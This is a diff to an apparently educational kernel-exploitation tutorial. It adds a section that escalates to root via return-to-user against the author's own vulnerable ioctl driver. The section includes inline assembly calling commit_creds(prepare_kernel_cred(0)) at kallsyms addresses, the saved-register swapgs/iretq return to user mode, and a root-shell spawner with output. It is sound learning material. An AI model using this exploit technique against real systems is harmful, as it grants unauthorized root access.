@@ -17,7 +17,9 @@
 * [Return-to-user](#return-to-user)  
 	 * [Writing ioctl kernel driver](#writing-ioctl-kernel-driver)  
 	 * [SMEP and SMAP](#smep-and-smap)
-	 * [Getting the stack cookie](#getting-the-stack-cookie)
+	 * [Getting the stack cookie](#getting-the-stack-cookie)  
+	 * [Overwriting return address](#overwriting-return-address)
+	 * [Getting root shell](#getting-root-shell)
 
 ## Creating the enviornment and the first kernel module
 
@@ -441,7 +443,7 @@ This looks something like this while running:
 [+] Stack cookie: 0xeb9458cb2481e00
 ```  
 
-### Returning to user space code  
+### Overwriting return address  
 Now, that we can read the stack and gather the stack cookie, we are able to modify the return address as well. We need to do this in two steps:  
 1) Finding the return address on the kernel stack  
 2) Rewriting it to an address pointig to our code    
@@ -515,3 +517,117 @@ Because the syscalls are called with software interrupts and there is still junk
 [   98.325100] Kernel panic - not syncing: Fatal exception in interrupt
 [   98.325416] Kernel Offset: disabled
 ```  
+### Getting root shell  
+In order to get root shell, we need to evelate our privileges in the exploit program, then open a shell from within. Because we can execute user space code from the kernel, we can easily call two kernel functions to achieve this: `commit_creds()` and `prepare_kernel_cred()`. If we call these like `commit_creds(prepare_kernel_cred(0))` we basically evelate the privileges of our process to root. 
+One way to call them is inline assembly. For that, we need to find the addresses of these functions. Because these are kernel functions, we can find them in `/proc/kallsyms` and they will have the same addresses in same kernel versions (if KASLR is not active):  
+```
+# cat /proc/kallsyms | grep commit_creds
+ffffffff81089b50 T commit_creds
+...
+# cat /proc/kallsyms | grep prepare_kernel_cred
+ffffffff81089f90 T prepare_kernel_cred
+...
+```  
+With these addresses we can write a simple assembly code to do the job:  
+```C
+void privesc(){
+	__asm__(
+		".intel_syntax noprefix;" // setting intel syntax
+		"movabs rax, 0xffffffff81089f90;"  // prepare_kernel_cred 
+		"xor rdi, rdi;" // 0 as parameter
+		"call rax;" // calling prepare_kernel_cred
+		"mov rdi, rax;" // setting the return to the parameter of commit_creds
+		"movabs rax, 0xffffffff81089b50;" // commit_creds
+		"call rax;" // calling commit_creds
+		".att_syntax;" // setting syntax back to at&t                                                                                                                              
+	);
+}
+```  
+And we can set the pointer to this function to the return address in our payload:  
+```C
+msg[MSG_SIZE - 1] = (unsigned long)privesc;
+```  
+What this assembly code does, is loading the addresses of the functions into the `rax` register, puts the arguments into `rdi` and calls these functions. To make our job easier, we can set the assembly syntax to intel, and at the and back to at&t.  
+Now we have a little problem. We cannot do anything with this exploit, because if we return to the privesc function, we will still be running in kernel mode. We cannot use this to attain root shell, we need to get back to user mode, hence the name `return to userland`. We can do this by calling the `iretq` instruction after commiting the creds. For `iretq` we need 5 parameters: `RIP`, `CS`, `SS`, `RSP` and `RFLAGS`. These are needed to continue execution in user mode. But if we try to replace them with junk, we won't be able to execute. To prevent this, we can save these before sending the payload:  
+```C
+unsigned long user_cs, user_ss, user_sp, user_rflags;
+
+void save_state(){
+	__asm__(
+		".intel_syntax noprefix;" // setting intel syntax
+		"mov user_cs, cs;" // saving address of code segment
+ 		"mov user_ss, ss;" // saving address of stack segment
+		"mov user_sp, rsp;" // saving stack pointer
+		"pushf;" // push flag register onto stack
+		"pop user_rflags;" // saving flag register
+		".att_syntax;"        
+	);
+}
+```  
+So we save the contents of the needed registers into variables, that we can use later in privesc. We won't save `rip` of course, because we will set it to the address of the shell spawning function:  
+```C
+void spawn_shell(){
+	printf("[+] Returned to userland, spawning root shell...\n");
+	if(getuid() == 0){
+		printf("[+] Privilege level successfully escalated, spawning shell...\n");
+		system("/bin/sh");
+	}else{
+		printf("[-] Failed to escalate privileges, exiting...\n");
+		exit(-1);
+	}
+}
+```  
+With these, we can complete our privesc function:  
+```C
+unsigned long user_rip = (unsigned long)spawn_shell;
+ 
+void privesc(){
+	__asm__(
+		...
+		"call rax;" // calling commit_creds
+		"swapgs;" // swapping the gs register
+		"mov r15, user_ss;"
+		"push r15;"
+		"mov r15, user_sp;"
+		"push r15;"
+		"mov r15, user_rflags;"
+		"push r15;"
+		"mov r15, user_cs;"
+		"push r15;"
+		"mov r15, user_rip;"
+		"push r15;"
+		"iretq;" // returning to user mode                                                                                                                
+		".att_syntax;" // setting syntax back to at&t
+	);
+}
+```  
+We basically pushing our saved variables onto the stack to use them as the parameters of `iretq`. One more thing: before `iretq` we need to swap the `GS` register, which is used in the linux kernel to differentiate between user mode and kernel mode. For that we are using the `swapgs` instruction before starting to pushing things to the stack.  
+After we are done with these, we need to call `save_state` before sending the payload, and spawn the root shell:  
+```C
+save_state();
+printf("[+] State saved\n");
+
+printf("[+] Sending payload...\n");
+ret = ioctl(fd, WRITE_STACK, (unsigned long)receiver);
+```  
+One more note: because we are using variables in the assembly code, we need to compile the code statically linked:  
+`gcc -o ret2user -static ret2user.c`  
+And trying the code on the target machine:  
+```
+# id
+uid=1000(user) gid=1000 groups=1000
+# ./ret2user 
+[+] Opening device file...
+[+] Trying to read from kernel stack...
+[ 6740.890817] Stack read
+[+] Received message
+[+] Stack cookie: 0x3b219bf292148400
+[+] State saved
+[+] Sending payload...
+[ 6740.893610] Stack write
+[+] Returned to userland, spawning root shell...
+[+] Privilege level successfully escalated, spawning shell...
+# id
+uid=0(root) gid=0(root)
+```  
+We got a root shell!
